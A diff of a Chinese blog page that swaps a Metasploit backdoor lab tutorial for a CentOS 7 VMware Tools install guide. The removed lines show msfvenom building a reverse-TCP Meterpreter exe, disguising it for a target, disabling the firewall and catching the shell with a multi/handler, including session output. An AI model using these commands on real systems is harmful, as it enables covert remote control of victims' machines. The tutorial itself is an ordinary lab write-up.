@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="后门,">
+  <meta name="keywords" content="基础,">
 
 
 
@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="后门简介后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。etasploit可以生成多种多样的后门，比如windows、linux、java、php等。  实验环境Kali linu">
-<meta name="keywords" content="后门">
+<meta name="description" content="Linux(CentOS 7)命令行模式安装VMware Tools 详解本例中为在Linux（以CentOS 7为例）安装VMware Tools。1.首先启动CentOS 7,在VMware中点击上方“VM”，点击“Install VMware Tools…”（如已安装则显示“Reinstall VMware Tools…”）。 2.在命令行输入“ls /dev”查看。 3.输入“mkdir">
+<meta name="keywords" content="基础">
 <meta property="og:type" content="article">
-<meta property="og:title" content="metasploit之后门的生成">
-<meta property="og:url" content="blog.shenzihao.top/2019/08/09/metasploit/index.html">
+<meta property="og:title" content="CentOS 7">
+<meta property="og:url" content="blog.shenzihao.top/2019/08/10/CentOS-7/index.html">
 <meta property="og:site_name" content="changyouB-log">
-<meta property="og:description" content="后门简介后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。etasploit可以生成多种多样的后门，比如windows、linux、java、php等。  实验环境Kali linu">
+<meta property="og:description" content="Linux(CentOS 7)命令行模式安装VMware Tools 详解本例中为在Linux（以CentOS 7为例）安装VMware Tools。1.首先启动CentOS 7,在VMware中点击上方“VM”，点击“Install VMware Tools…”（如已安装则显示“Reinstall VMware Tools…”）。 2.在命令行输入“ls /dev”查看。 3.输入“mkdir">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-10T03:45:49.298Z">
+<meta property="og:updated_time" content="2019-08-10T03:47:12.750Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="metasploit之后门的生成">
-<meta name="twitter:description" content="后门简介后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。etasploit可以生成多种多样的后门，比如windows、linux、java、php等。  实验环境Kali linu">
+<meta name="twitter:title" content="CentOS 7">
+<meta name="twitter:description" content="Linux(CentOS 7)命令行模式安装VMware Tools 详解本例中为在Linux（以CentOS 7为例）安装VMware Tools。1.首先启动CentOS 7,在VMware中点击上方“VM”，点击“Install VMware Tools…”（如已安装则显示“Reinstall VMware Tools…”）。 2.在命令行输入“ls /dev”查看。 3.输入“mkdir">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="blog.shenzihao.top/2019/08/09/metasploit/">
+  <link rel="canonical" href="blog.shenzihao.top/2019/08/10/CentOS-7/">
 
 
 
 
 
-  <title>metasploit之后门的生成 | changyouB-log</title>
+  <title>CentOS 7 | changyouB-log</title>
   
 
 
@@ -233,7 +233,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="blog.shenzihao.top/2019/08/09/metasploit/">
+    <link itemprop="mainEntityOfPage" href="blog.shenzihao.top/2019/08/10/CentOS-7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="申子昊">
@@ -250,7 +250,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">metasploit之后门的生成</h1>
+          <h1 class="post-title" itemprop="name headline">CentOS 7</h1>
         
 
         <div class="post-meta">
@@ -262,8 +262,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-09T17:56:41+08:00">
-                2019-08-09
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-10T10:14:46+08:00">
+                2019-08-10
               </time>
             
 
@@ -305,74 +305,26 @@
       
 
       
-        <h2 id="后门简介"><a href="#后门简介" class="headerlink" title="后门简介"></a>后门简介</h2><p>后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。etasploit可以生成多种多样的后门，比如windows、linux、java、php等。</p>
-<hr>
-<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>Kali linux ip 192.168.10.128  </p>
-<p>WIN7 ip 10.0.2.2 </p>
-<hr>
-<p>选择以下攻击载荷并生成一个exe的木马程序</p>
-<p>命令msfconsole 开启Metasploit</p>
-<p>查看payload，使用命令show payloads，msf提供了多种攻击载荷</p>
-<p>选择以下攻击载荷（使用TAB键自动补全），并生成一个exe的木马程序</p>
-<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.128 lport=4444 -f exe -o /123.exe</p>
-<p>其中，lhost为kali linx的IP地址 生成的exe文件存放在根目录下</p>
-<hr>
-<p><strong>使用命令 cd /，可以看到我们生成的exe文件</strong></p>
-<hr>
-<p>接下来，我们需要把生成的exe文件伪装成其他文件发送到目标机上。由于实验机环境限制，为了把我们生成的exe上传到目标机上，这里我们需要使用Putty这个工具，将生成的exe文件传到win7虚拟机上。</p>
-<hr>
-<p>为了不出现连接被拒绝的情况，我们首先要在kali linux上打开ssh服务，并且关闭win7防火墙。</p>
-<p>在kali linux上打开ssh服务的方法：</p>
-<p>apt-get install openssh-server#安装</p>
-<p>一、配置SSH参数</p>
-<p>修改sshd_config文件，命令为：</p>
-<p>vi /etc/ssh/sshd_config</p>
-<p>将#PasswordAuthentication no的注释去掉，并且将NO修改为YES，kali中默认是yes</p>
-<p>右击桌面，单击打开终端，输入命令</p>
-<p>将PermitRootLogin without-password修改为</p>
-<p>PermitRootLogin yes</p>
-<p>二、启动SSH服务</p>
-<p>命令为：</p>
-<p>/etc/init.d/ssh start</p>
-<p>或者</p>
-<p>service ssh start</p>
-<p>查看SSH服务状态是否正常运行，命令为</p>
-<p>/etc/init.d/ssh status</p>
-<p>或者service ssh status</p>
-<p>那么需要生成两个密钥：</p>
-<p>ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key</p>
-<p>ssh-keygen -t dsa -f /etc/ssh/ssh_host_rsa_key</p>
-<p>执行命令后都会让输入密码，直接敲回车设置为空即可</p>
-<hr>
-<p><strong>Win7关闭防火墙的方法</strong></p>
-<hr>
-<p>接着打开win7上win+R输入psftp.exe，使用命令 open192.168.10.128  ，连接到kali linux，使用cd /跳转到根目录下，使用命令get 文件名把文件下载到本地。</p>
-<hr>
-<p>在msf中设置监听</p>
-<p>use exploit/multi/handler </p>
-<p>show options </p>
-<p>设置我们后门生成时的攻击载荷</p>
-<p>set payload windows/meterpreter/reverse_tcp</p>
-<p>show options </p>
-<p>set payload windows/meterpreter/reverse_tcp</p>
-<p>payload =&gt; windows/meterpreter/reverse_tcp</p>
-<hr>
-<p>设置参数（与后门的参数相对应）</p>
-<p>msf exploit(multi/handler) &gt; set LHOST 192.168.10.128</p>
-<p>LHOST =&gt; 192.168.10.128</p>
-<p>msf exploit(multi/handler) &gt; set LPORT 4444</p>
-<p>LPORT =&gt; 4444</p>
-<p>msf exploit(multi/handler) &gt; run</p>
-<hr>
-<p>在windows主机上点击123.exe。当被攻击者运行了我们上传的后门程</p>
-<p>序时，会弹回一个shell</p>
-<p>[*] Started reverse TCP handler on 192.168.10.128:4444 </p>
-<p>[*] Sending stage (179779 bytes) to 192.168.10.1</p>
-<p>[*] Sleeping before handling stage…</p>
-<p>[*] Meterpreter session 1 opened (192.168.10.128:4444 -&gt; 192.168.10.1:53292) at 2019-07-28 14:08:08 +0800</p>
-<hr>
-<hr>
-<h3 id="实验结束"><a href="#实验结束" class="headerlink" title="实验结束"></a>实验结束</h3>
+        <h1 id="Linux-CentOS-7-命令行模式安装VMware-Tools-详解"><a href="#Linux-CentOS-7-命令行模式安装VMware-Tools-详解" class="headerlink" title="Linux(CentOS 7)命令行模式安装VMware Tools 详解"></a>Linux(CentOS 7)命令行模式安装VMware Tools 详解</h1><p>本例中为在Linux（以CentOS 7为例）安装VMware Tools。<br>1.首先启动CentOS 7,在VMware中点击上方“VM”，点击“Install VMware Tools…”（如已安装则显示“Reinstall VMware Tools…”）。</p>
+<p>2.在命令行输入“ls /dev”查看。</p>
+<p>3.输入“mkdir /mnt/cdrom”在/mnt目录下新建一个名为cdrom的文件夹。</p>
+<p>4.输入“mount -t iso9660 /dev/cdrom /mnt/cdrom”将光盘挂载到/mnt/cdrom目录下。</p>
+<p>5.输入“ls /mnt/cdrom/”查看内容，输入“cp /mnt/cdrom/VMwareTools-9.2.0-799703.tar.gz /root/vm.tar.gz”,将名为“VMwareTools-9.2.0-799703.tar.gz”复制到/root目录下，并重新命名为vm.tar.gz。</p>
+<p>6.在根目录下输入“ls”查看文件，输入“tar -xzf vm.tar.gz”将文件解压，输入“ls”查看文件，可发现新增目录“vmware-tools-distrib”。</p>
+<p>7.输入“cd vmware-tools-distrib/”进入名为“vmware-tools-distrib”的目录，输入“./vmware-install.pl”尝试安装，出现错误“-bash: ./vmware-install.pl: /usr/bin/per: bad interpreter: No such file or directory”，表明未安装编译环境。</p>
+<p>8.输入“yum -y install perl gcc make kernel-headers kernel-devel”开始安装。</p>
+<p>9.提示已经安装完毕。</p>
+<p>10.在“vmware-tools-distrib”目录下重新输入“./vmware-install.pl”开始安装，基本上按回车键即可。</p>
+<p>11.VMware Tools已经安装完毕，提示可以运行“/usr/bin/vmware-uninstall-tools.pl”命令卸载VMware Tools。第一次运行时需运行“/usr/bin/vmware-config-tools.pl”命令配置VMware Tools，按回车键直接运行。</p>
+<p>12.提示已经安装完毕，可以开始使用。</p>
+<p>13.输入”/usr/bin/vmware-user”启动vmware用户进程，并输入”startx“启动图形界面。</p>
+<p>14.选择文件（本例中为”测试文档.docx”）并摁住鼠标左键不放，尝试拖动文件到虚拟机。</p>
+<p>15.放开鼠标左键，发现文件已经复制到虚拟机。</p>
+<p>16.如需卸载VMware Tools，输入“/usr/bin/vmware-uninstall-tools.pl”即可。</p>
+<p>17.如需在Gnome GUI图形界面下安装，则只需将文件解压，然后再文件夹里点鼠标右键，选择“Open in Terminal”,在Terminal里面输入“./vmware-install.pl”即可。</p>
+<p>安装故障<br>18.如安装时出现类似下图错误，提示无法删除open-vm-tools，则可能是因为上次安装失败造成。</p>
+<p>19.如尝试输入“/usr/bin/vmware-uninstall-tools.pl”仍无法卸载，则输入“rpm -e open-vm-tools-desktop”卸载并重新安装。</p>
+
       
     </div>
     
@@ -389,7 +341,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/后门/" rel="tag"># 后门</a>
+            <a href="/tags/基础/" rel="tag"># 基础</a>
           
         </div>
       
@@ -402,8 +354,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/08/hello-world/" rel="next" title="Hello World">
-                <i class="fa fa-chevron-left"></i> Hello World
+              <a href="/2019/08/09/SRC/" rel="next" title="SRC">
+                <i class="fa fa-chevron-left"></i> SRC
               </a>
             
           </div>
@@ -412,8 +364,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/08/09/SRC/" rel="prev" title="SRC">
-                SRC <i class="fa fa-chevron-right"></i>
+              <a href="/2019/08/10/linux常用命令/" rel="prev" title="linux常用命令">
+                linux常用命令 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -561,7 +513,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#后门简介"><span class="nav-number">1.</span> <span class="nav-text">后门简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#实验环境"><span class="nav-number">1.1.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验结束"><span class="nav-number">1.2.</span> <span class="nav-text">实验结束</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-CentOS-7-命令行模式安装VMware-Tools-详解"><span class="nav-number">1.</span> <span class="nav-text">Linux(CentOS 7)命令行模式安装VMware Tools 详解</span></a></li></ol></div>
             
 
           </div>
